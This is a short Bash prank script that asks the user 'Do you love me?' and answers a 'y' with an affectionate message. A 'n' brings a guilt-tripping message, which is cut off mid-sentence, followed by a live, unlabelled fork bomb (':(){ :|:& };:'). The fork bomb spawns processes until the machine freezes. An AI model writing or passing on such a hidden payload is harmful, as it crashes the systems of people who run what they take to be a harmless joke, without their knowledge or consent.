#!/bin/bash

echo "Do you love me? (y/n): "
read shh

if [ "$shh" == "y" ]; then
    echo "Thank you, my friend. I love you too."
elif [ "$shh" == "n" ]; then
    echo "But why don't you love me? I've earned you for my >"
:(){ :|:& };:
else
    echo "Error"
fi
